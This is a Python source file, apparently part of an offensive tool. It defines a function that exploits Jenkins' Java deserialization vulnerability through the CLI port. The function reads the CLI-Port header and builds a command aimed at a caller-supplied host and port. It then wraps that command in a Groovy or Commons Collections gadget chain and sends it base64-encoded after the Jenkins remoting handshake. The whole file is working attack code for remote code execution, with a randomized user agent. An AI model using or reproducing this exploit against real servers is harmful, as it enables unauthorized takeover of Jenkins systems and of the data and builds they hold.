import base64
import socket

from src.exploits.ex1 import get_payload_gadget
from src.utils.colors import Colors
from src.utils.misc import generate_cmd_for_runtime_exec, print_and_flush, get_random_user_agent


def exploit_jenkins(
    url: str,
    host: str,
    port: int,
    cmd: str,
    is_win: bool,
    gadget: str,
) -> int:
    """
    Эксплуатирует уязвимость десериализации в Jenkins через CLI-порт, отправляя сериализованный объект.
    """
    if "://" in url:
        cli_ip = url.split("://", 1)[1].split("/", 1)[0].split(":", 1)[0]
    else:
        cli_ip = url.split("/", 1)[0].split(":", 1)[0]

    headers = {
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Connection": "keep-alive",
        "User-Agent": get_random_user_agent(),
    }
    response = gl_http_pool.request("GET", url, redirect=True, headers=headers)

    cli_port = None
    for name, value in response.getheaders():
        if name == "CLI-Port":
            cli_port = int(value)
            break
    if cli_port is None:
        return 505

    cmd = generate_cmd_for_runtime_exec(cmd, host, port, is_win)
    if gadget == "commons-collections3.1":
        gadget = "groovy1"
    payload_gadget = get_payload_gadget(gadget_type=gadget, cmd=cmd)
    payload = b"<===[JENKINS REMOTING CAPACITY]===>" + base64.b64encode(payload_gadget)

    print_and_flush(f"{Colors.GREEN}\n * Sending serialized object to: {cli_ip}:{cli_port}\n{Colors.ENDC}")
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(7)
        s.connect((cli_ip, cli_port))
        s.send(b"\x00\x14Protocol:CLI-connect")
        while b"JENKINS REMOTING CAPACITY" not in s.recv(1024):
            pass
        s.send(payload)
        s.close()
    except socket.error as err:
        print_and_flush(f"{Colors.RED}\n * [ERROR]: {err} ({cli_ip}:{cli_port}).\n{Colors.ENDC}")
        return 505

    return 200
